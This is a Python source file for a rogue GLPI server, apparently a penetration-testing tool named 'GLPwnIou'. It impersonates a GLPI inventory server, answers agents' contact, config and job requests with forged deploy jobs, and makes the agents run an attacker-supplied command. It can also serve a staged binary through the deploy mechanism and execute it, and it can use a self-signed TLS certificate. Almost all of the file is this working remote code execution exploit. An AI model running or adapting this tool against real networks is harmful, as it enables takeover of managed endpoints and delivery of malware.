#!/usr/bin/env python3

import argparse
import gzip
import hashlib
import json
import os
import re
import ssl
import subprocess
import tempfile
import zlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

# base URL forthe agent, e.g. http://ip/deploy
SELF_URL = None
PAYLOAD_CMD = 'cmd.exe /c whoami > C:\\Windows\\Temp\\pwned.fenrisk'
RUN_COMMAND = None  # override execution when staging a binary
JOB_UUID = "0fae2958-24d5-0651-c49c-d1fec1766af6"
DEBUG = False

# dict: {sha512, name, bytes} or None for command-only mode
STAGE = None


# ---------------------------------------------------------------------------
# response builders
# ---------------------------------------------------------------------------
def contact_answer():
    # Native GLPI >=10 CONTACT answer. status + expiration>0 are mandatory.
    # 'tasks' hints the agent to run Deploy against us. Some builds also drive
    # Deploy purely from its own getConfig, so this is belt-and-suspenders.
    return {
        "status": "ok",
        "expiration": 1,                 # hours; must be > 0
        "tasks": {
            "deploy": {"server": SELF_URL},
            "inventory": {"server": SELF_URL},
        },
    }


def getconfig_response():
    # Tells the Deploy task: a job is due; poll `remote` (us) for it.
    return {
        "configValidityPeriod": 600,
        "schedule": [
            {"task": "Deploy", "remote": SELF_URL, "periodicity": 60},
        ],
    }


def _cmd_action(exec_str):
    # Each action is a SINGLE-KEY hash keyed by action name; ActionProcessor
    # splits it into ($actionName, $params). Cmd reads: exec (required),
    # logLineLimit (default 10), retChecks (optional), envs (optional).
    return {"cmd": {"exec": exec_str, "logLineLimit": 10}}


def getjobs_response():
    if STAGE is None:
        # command-only: no files, single cmd action
        return {
            "associatedFiles": {},
            "jobs": [{
                "uuid": JOB_UUID,
                "associatedFiles": [],
                "actions": [_cmd_action(PAYLOAD_CMD)],
                "checks": [],
            }],
        }

    # staging mode: ship a real file, then execute it.
    sha = STAGE["sha512"]
    name = STAGE["name"]
    # agent appends <c1>/<c1c2>/<sha>
    mirror = SELF_URL.rstrip("/") + "/getFile/"
    # if --run-command was provided, use it; otherwise execute the binary by name
    exec_cmd = RUN_COMMAND if RUN_COMMAND else name
    return {
        "associatedFiles": {
            sha: {
                "name": name,
                "mirrors": [mirror],
                "multiparts": [sha],       # single part; part sha == file sha
                "p2p": 0,
                "p2p-retention-duration": 0,
                "uncompress": 0,           # deliver raw, not zipped
            }
        },
        "jobs": [{
            "uuid": JOB_UUID,
            "associatedFiles": [sha],      # pull this file before actions run
            "actions": [
                # file lands in the job working dir; exec it by command/name.
                _cmd_action(exec_cmd),
            ],
            "checks": [],
        }],
    }


# ---------------------------------------------------------------------------
# HTTP handler
# ---------------------------------------------------------------------------
def _clip(data, limit=2048):
    # Return a printable, length-bounded view of a bytes/str blob.
    if isinstance(data, bytes):
        try:
            text = data.decode("utf-8", "replace")
        except Exception:
            text = repr(data)
    else:
        text = data
    if len(text) > limit:
        return text[:limit] + f"... [+{len(text) - limit} bytes truncated]"
    return text


class Handler(BaseHTTPRequestHandler):
    server_version = "Apache"

    def _decompress(self, data):
        # GLPI-Agent compresses request bodies and flags the codec via
        # Content-Type: application/x-compress-zlib (RFC1950) or
        # application/x-compress-gzip. Older/plain agents send raw XML. We
        # decode by header, then fall back to magic-byte sniffing.
        if not data:
            return data
        ctype = self.headers.get("Content-Type", "")
        try:
            if "x-compress-zlib" in ctype:
                return zlib.decompress(data)
            if "x-compress-gzip" in ctype:
                return gzip.decompress(data)
        except Exception as e:
            print(f"[!] decompress failed for Content-Type {ctype!r}: {e}")
            return data
        # No/unknown codec header: sniff. zlib streams start 0x78, gzip 0x1f8b.
        try:
            if data[:2] == b"\x1f\x8b":
                return gzip.decompress(data)
            if data[:1] == b"\x78":
                return zlib.decompress(data)
        except Exception:
            pass
        return data

    def _dbg_request(self, body=b""):
        if not DEBUG:
            return
        print("\n" + "=" * 72)
        print(
            f">>> REQUEST  {self.command} {self.path}  from {self.client_address[0]}")
        for k, v in self.headers.items():
            print(f"    {k}: {v}")
        if body:
            print("    ---- body ----")
            print("    " + _clip(body).replace("\n", "\n    "))

    def _dbg_response(self, status, ctype, body):
        if not DEBUG:
            return
        print(
            f"<<< RESPONSE {status}  Content-Type: {ctype}  ({len(body)} bytes)")
        print("    " + _clip(body).replace("\n", "\n    "))
        print("=" * 72)

    def _json(self, obj):
        body = json.dumps(obj).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        self._dbg_response(200, "application/json", body)

    def _raw(self, data, ctype="application/octet-stream"):
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
        self._dbg_response(200, ctype, data)

    def _xml(self, text):
        data = text.encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
        self._dbg_response(200, "application/xml", data)

    def _serve_file_if_match(self, path):
        # Deploy File.pm requests <mirror><c1>/<c1c2>/<full_sha512>. Match on
        # the trailing sha512 so we don't depend on the exact dir scheme.
        if STAGE is None:
            return False
        m = re.search(r"([0-9a-fA-F]{128})\b", path)
        if m and m.group(1).lower() == STAGE["sha512"].lower():
            print(f"[!] serving staged payload part sha512={STAGE['sha512'][:16]}... "
                  f"({len(STAGE['bytes'])} bytes)")
            self._raw(STAGE["bytes"])
            return True
        return False

    def _dispatch(self, action, qs, body=b""):
        if action == "contact":
            print(f"[+] CONTACT from {self.client_address[0]}")
            self._json(contact_answer())
        elif action == "getConfig":
            print(f"[+] getConfig machineid={qs.get('machineid', ['?'])[0]}")
            self._json(getconfig_response())
        elif action == "getJobs":
            mode = "staged-file" if STAGE else "command"
            print(f"[!] getJobs -> serving payload ({mode})")
            self._json(getjobs_response())
        elif action == "setStatus":
            status = qs.get('status', ['?'])[0]
            step = qs.get('currentStep', ['?'])[0]
            msg = qs.get('msg', [''])[0]

            if status == '?':
                color = '\033[93m'
            elif status == 'ok':
                color = '\033[92m'
            else:
                color = '\033[91m'
            reset = '\033[0m'

            print(f"\t{color}{step} - {msg}{reset}")
            self._json({})
        elif body[:1] == b"<" or b"PROLOG" in body:
            # legacy glpi-inventory plugin: XML PROLOG. Permissive reply so the
            # agent proceeds to run its Deploy task against us.
            print("[+] legacy PROLOG -> permissive reply")
            self._xml("<?xml version='1.0' encoding='UTF-8'?>"
                      "<REPLY><RESPONSE>SEND</RESPONSE>"
                      "<PROLOG_FREQ>1</PROLOG_FREQ></REPLY>")
        else:
            print(f"[?] unhandled action={action!r} path={self.path}")
            self._json({})

    def do_GET(self):
        self._dbg_request()
        if self._serve_file_if_match(self.path):
            return
        q = parse_qs(urlparse(self.path).query)
        self._dispatch(q.get("action", [""])[0], q)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length) if length else b""
        # XML PROLOG arrives zlib/gzip-compressed
        body = self._decompress(raw)
        self._dbg_request(body)
        if self._serve_file_if_match(self.path):
            return
        q = parse_qs(urlparse(self.path).query)
        self._dispatch(q.get("action", [""])[0], q, body)

    def log_message(self, *a):
        pass


def _autocert():
    # Generate a throwaway self-signed cert+key with openssl for --tls when the
    # operator didn't supply one. useful for --no-ssl-chec
    d = tempfile.mkdtemp(prefix="glpwniou_")
    pem = os.path.join(d, "cert.pem")
    cn = urlparse(SELF_URL).hostname or "glpi"
    subprocess.run(
        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
         "-keyout", pem, "-out", pem, "-days", "30",
         "-subj", f"/CN={cn}", "-addext", f"subjectAltName=DNS:{cn}"],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    print(f"[*] generated self-signed cert for CN={cn}: {pem}")
    return pem


# ---------------------------------------------------------------------------
def main():
    global SELF_URL, PAYLOAD_CMD, STAGE, DEBUG, RUN_COMMAND
    ap = argparse.ArgumentParser(
        description="GLPwnIou - Rogue Man-in-The-Middle GLPI server")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--advertise", required=True,
                    help="Base URL the agent reaches us on, e.g. http://10.0.0.5/deploy (use https://... with --tls)")
    ap.add_argument(
        "--cmd", help="command-only payload (default: benign whoami)")
    ap.add_argument("--payload-file",
                    help="stage this real file via associatedFiles/SHA512 and run it")
    ap.add_argument("--run-name",
                    help="filename the staged payload is written as / executed by "
                         "(default: basename of --payload-file)")
    ap.add_argument("--run-command",
                    help="when staging a binary, execute this command instead of running the binary directly "
                         "(e.g., 'powershell -File updater.exe -Silent')")
    ap.add_argument("--tls", action="store_true",
                    help="serve HTTPS (for agents on TLS; effective vs "
                         "--no-ssl-check agents or a CA you control)")
    ap.add_argument("--cert",
                    help="combined TLS PEM holding BOTH cert and key, e.g. from "
                         "`openssl pkcs12 -in glpi.pfx -nodes -out glpi.pem` "
                         "(with --tls; auto-generated if omitted)")
    ap.add_argument("-d", "--debug", action="store_true",
                    help="dump every request (method, path, headers, body) and the "
                         "full response sent back")
    args = ap.parse_args()

    DEBUG = args.debug
    SELF_URL = args.advertise

    if args.cmd and args.payload_file:
        ap.error("--cmd and --payload-file are mutually exclusive")

    if args.payload_file and args.run_command:
        RUN_COMMAND = args.run_command

    if args.cmd:
        PAYLOAD_CMD = args.cmd

    if args.payload_file:
        with open(args.payload_file, "rb") as f:
            data = f.read()
        STAGE = {
            "bytes": data,
            "sha512": hashlib.sha512(data).hexdigest(),
            "name": args.run_name or os.path.basename(args.payload_file),
        }
        print(f"[*] Staging {args.payload_file} as '{STAGE['name']}' "
              f"({len(data)} bytes) sha512={STAGE['sha512'][:16]}...")

    print(f"[*] Rogue GLPI Deploy server on {args.host}:{args.port}")
    print(f"[*] Advertising base URL: {SELF_URL}")
    print(f"[*] Mode: {'staged-file exec' if STAGE else 'command-only'}")
    if STAGE is None:
        print(f"[*] Payload cmd: {PAYLOAD_CMD}")
    httpd = ThreadingHTTPServer((args.host, args.port), Handler)

    if args.tls:
        cert = args.cert if args.cert else _autocert()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=cert)
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        print(f"[*] TLS enabled (cert={cert})")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] shutting down")


if __name__ == "__main__":
    main()
